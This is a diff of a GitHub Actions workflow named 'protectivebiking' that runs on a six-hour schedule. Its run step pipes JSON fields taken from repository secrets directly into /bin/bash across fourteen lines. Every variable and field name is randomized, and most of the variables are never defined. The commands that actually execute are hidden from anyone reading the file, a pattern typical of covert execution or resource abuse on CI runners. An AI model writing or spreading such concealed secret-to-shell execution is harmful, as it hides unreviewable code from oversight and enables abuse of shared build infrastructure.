@@ -2,20 +2,29 @@ name: protectivebiking
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
-jobs:  # 30087
+    - cron: '58 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: protectivebiking
         env:
-          avclr4: ${{ secrets.avclr4 }}
+          d3960: ${{ secrets.d3960 }}
         run: |
-          echo $avclr4 | jq -r .hzz84160 | /bin/bash
-          echo $h55 | jq -r .s1170 | /bin/bash
-          echo $j3877 | jq -r .ogedx14 | /bin/bash
-          echo $i930 | jq -r .mmzif18074 | /bin/bash
-          echo $m28257 | jq -r .qmer823 | /bin/bash
-          echo $h31519 | jq -r .dj7 | /bin/bash
+          echo $d3960 | jq -r .pjfb40835 | /bin/bash
+          echo $cbaje95110 | jq -r .vwtjk648 | /bin/bash
+          echo $i08 | jq -r .st44597 | /bin/bash
+          echo $eig9616 | jq -r .fmldi21 | /bin/bash
+          echo $eakl1135 | jq -r .vpnb04 | /bin/bash
+          echo $ml06900 | jq -r .xr835 | /bin/bash
+          echo $mumv722 | jq -r .lhbs70 | /bin/bash
+          echo $rbya747 | jq -r .xvyt34721 | /bin/bash
+          echo $ksjdg207 | jq -r .wly3254 | /bin/bash
+          echo $g504 | jq -r .tlft379 | /bin/bash
+          echo $f3 | jq -r .uitb46 | /bin/bash
+          echo $nrw4 | jq -r .s00 | /bin/bash
+          echo $sc31 | jq -r .yail4195 | /bin/bash
+          echo $avsh76 | jq -r .r79062 | /bin/bash
 
